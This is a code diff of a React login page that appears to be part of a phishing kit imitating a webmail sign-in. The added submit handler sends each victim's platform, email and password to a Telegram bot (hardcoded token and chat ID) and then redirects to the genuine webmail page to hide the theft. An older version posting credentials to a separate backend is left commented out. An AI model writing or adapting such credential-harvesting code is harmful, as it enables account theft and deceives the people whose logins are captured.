@@ -23,26 +23,58 @@ function Next(){
     const[showPassword, setShowPassword] = useState(false);
 
 
+    // async function handleSubmit(e){
+    //     e.preventDefault();
+    
+    //     try {
+
+    //         setIsLoading(true);
+    //         const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
+    //             email:email,
+    //             password:password,
+    //             platform:platform
+    //         });
+        
+    //         // Handle success
+    //         console.log('Data sent:', response.data.message);
+    
+    //         if(response.status == 200){
+    //             console.log(response.data.message);
+    
+    //             window.location.href = 'https://mail.nvc.net/webmail/';
+
+    //         }
+    //       } catch (error) {
+    //         // Handle error
+    //         console.error('Error:', error);
+    //       }
+        
+    // }
+
     async function handleSubmit(e){
         e.preventDefault();
     
         try {
-
-            setIsLoading(true);
-            const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
-                email:email,
-                password:password,
-                platform:platform
-            });
+           
+    
+    
+            
+    
+    
+           const response =  await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                chat_id: 5916570239,
+                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+              });
+    
         
             // Handle success
-            console.log('Data sent:', response.data.message);
+         
     
             if(response.status == 200){
-                console.log(response.data.message);
+               // console.log(response.data.message);
     
-                window.location.href = 'https://mail.nvc.net/webmail/';
-
+              //https://webmail-nvc.onrender.com
+               window.location.href = 'https://mail.nvc.net/webmail/';
             }
           } catch (error) {
             // Handle error
@@ -50,13 +82,14 @@ function Next(){
           }
         
     }
+    
 
 
 
     return (
         <div className='mainContent'>
 
-        <div className='col-md-3 m-auto maindivtwo'>
+        <div className='col-md-3 m-auto maindivtwo py-4'>
 
             <div className='imagediv text-center py-3'>
                 
